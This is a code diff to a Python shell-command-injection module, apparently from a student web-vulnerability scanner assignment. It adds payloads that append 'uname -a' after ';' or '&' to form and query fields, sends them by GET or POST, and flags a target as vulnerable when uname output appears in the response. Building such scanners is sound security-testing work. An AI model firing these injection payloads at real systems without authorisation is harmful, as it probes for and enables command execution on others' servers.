@@ -24,9 +24,33 @@ class ShlCmdInjAttackModule(AttackModule):
 		"\"uname -a #\"",
 		"\"; uname -a\"",
 		"\"; uname -a;\"",
-		"\"; uname -a; \""
+		"\"; uname -a; \"",
+
+		" & uname -a",	
+		" & uname -a #",
+		" & uname -a; ",
+		"& uname -a",
+		"& uname -a #",
+		"& uname -a; ",
+
+		"\' & uname -a\'",	
+		"\' & uname -a #\'",
+		"\' & uname -a; \'",
+		"\'& uname -a\'",
+		"\'& uname -a #\'",
+		"\'& uname -a; \'",
+
+		"\" & uname -a\"",	
+		"\" & uname -a #\"",
+		"\" & uname -a; \"",
+		"\"& uname -a\"",
+		"\"& uname -a #\"",
+		"\"& uname -a; \"",
 	]
-	unameString = "Linux student-CS5331-A2 3.13.0-32-generic"
+	unameStrings = [
+		"Linux student-CS5331-A2 3.13.0-32-generic",
+		"Linux xefro-ux 4.13.0-38-generic"
+	]
 
 
 	def __init__(self):
@@ -34,24 +58,62 @@ class ShlCmdInjAttackModule(AttackModule):
 		
 
 	def attack(self, endpoint):
+		self.attack_succeeded = False
+		self.attack_report = None
 		if True not in (endpoint.is_form(), endpoint.has_query_string()):
-			print "Target: {0}\nIs not a form, nor a has a query string. Skipping!".format(endpoint.url)
+			print "    Target: {0}\n    Is not a form, nor a has a query string. Skipping!".format(endpoint.url)
 			return
 		
-		print "Beginning attack -> Shell Command Injection\nTarget: {0}".format(endpoint.url)
+		print "    Beginning attack -> Shell Command Injection"
 		totalAttacks = len(ShlCmdInjAttackModule.attackPatterns)
 		attackCounter = 1
 		for attackPattern in ShlCmdInjAttackModule.attackPatterns:
-			print "  [ {0} / {1}, {2} ] ->".format(attackCounter, totalAttacks, attackPattern),
-			print self.is_attack_successful(self.launch_attack(endpoint))
-			attackCounter += 1
+			result = self.launch_attack(endpoint, attackPattern)
+			if result:
+				self.attack_succeeded = True
+				print "    [ ShlCmdInj: {0} / {1}, {2} ] ->".format(attackCounter, totalAttacks, attackPattern),
+				print result
+				break
+			else:
+				attackCounter += 1
+
+		if self.attack_succeeded:
+			print "    Finished attack -> VULNERABLE!\n"
+		else:
+			print "    Finished attack -> Nothing found!\n"
+			
 	
-	def launch_attack(self, endpoint):
-		#if endpoint.method.upper() == "GET":
-			#return Helper.do_get_request(endpoint, {}, {})
-		return None
+	def launch_attack(self, endpoint, payload):
+		headers = {}
+		formData = {}
+		if endpoint.is_form():
+			formData = endpoint.get_form().get_form_data_dict()
+		elif endpoint.has_query_string():
+			formData = endpoint.get_query_string_dict()
+		
+		for key in formData.keys():
+			formData[key] = payload
+			res = None
+			if endpoint.method.upper() == "GET":
+				res = Helper.do_get_request(endpoint, headers, formData)
+			elif endpoint.method.upper() == "POST":
+				res = Helper.do_post_request(endpoint, headers, formData)
+
+			if self.is_attack_successful(res):
+				#record results
+				return True
+
+		return False
 
 	def is_attack_successful(self, res):
-		return True
+		if res.ok:
+			if res.status_code == 200:
+				if any(match in res.text for match in ShlCmdInjAttackModule.unameStrings):
+					return True
+			else:
+				print "WARNING: ShlCmdInjAttackModule, " + \
+					"is_attack_successful, unrecognized status code: {0} for {1}".format(
+						res.status_code, res.request.url)
+		return False
 			
 		
